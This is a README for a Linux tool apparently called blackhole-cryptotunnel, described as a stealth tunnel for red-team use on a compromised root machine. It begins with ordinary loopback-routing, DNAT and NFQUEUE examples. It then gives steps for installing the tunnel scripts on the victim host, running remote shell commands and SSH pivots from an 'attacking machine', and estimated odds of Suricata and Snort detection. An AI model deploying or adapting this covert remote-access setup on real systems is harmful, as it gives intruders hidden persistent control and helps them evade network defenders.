# blackhole-cryptotunnel
Enhanced Stealth Tunnel for Linux (Red Team Ops on compromised machine with root).

# Based on this article: Hidden routing via lo: why send traffic to yourself.
The lo (loopback) interface is not just about 127.0.0.1 and localhost.
If desired, you can use it to arrange non-standard routing: redirect packets to yourself, mask services, or isolate experiments.
Why direct traffic to lo at all?
Test the routing behavior without going online.
Disguise services: they listen to lo, and access to them is via DNAT.
Use as a "black hole" with logging capability.
Make local hairpin NAT for containers and VMs.
Collect traffic for analysis without releasing it outside.

Route via lo, but not in 127.0.0.1
Let's say we have an internal IP: 10.10.10.10, which is not configured anywhere on the interface. Adding a route:
ip route add 10.10.10.10 dev lo
Now any package by 10.10.10.10 will go to loopback. If you start a server listening to this IP, it will receive such packets:
ip addr add 10.10.10.10/32 dev lo nc -l 10.10.10.10 1234
DNAT + lo = local service accessible from outside
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080
-j DNAT --to-destination 10.10.10.10:1234

The application is still listening to lo:1234, but it is available on the external port eth0:8080.

Blackhole with logs:
Instead of ip route, add blackhole — we'll send everything to lo and log in:

ip route add 198.51.100.0/24 dev lo iptables -A INPUT -d 198.51.100.0/24 -j LOG --log-prefix "lo-drop: " iptables -A INPUT -d 198.51.100.0/24 -j DROP

Traffic processing via lo + NFQUEUE

Do I need an interception in userspace? We will pass packets through lo, even if they are not for 127.0.0.1.:

ip route add 172.16.99.99 dev lo iptables -A INPUT -d 172.16.99.99 -j NFQUEUE --queue-num 0

Now you can process them in your script via nfqueue.

# On compromised machine:
Copy and launch a file: 
crypto_tunnel.py & enhanced_stealth_tunnel.py in /opt/enhanced-stealth-tunnel 
cd /opt/enhanced-stealth-tunnel
python3 enhanced_stealth_tunnel.py --generate-config

# Editing enhanced_tunnel_config.json
python3 enhanced_stealth_tunnel.py -c enhanced_tunnel_config.json

or launch ./enhanced_install.sh

# 2. From the attacking machine:
launch a file:
python3 enhanced_client.py 192.168.1.50 -k tunnel.key --shell "whoami"
python3 enhanced_client.py 192.168.1.50 -k tunnel.key --ssh 198.51.100.10

# A realistic estimate of the probability of detection
Basic tunnel configuration:

    Suricata: ~35-45% probability of detection
    Snort: ~25-35% probability of detection
    Combined risk: ~55-65%
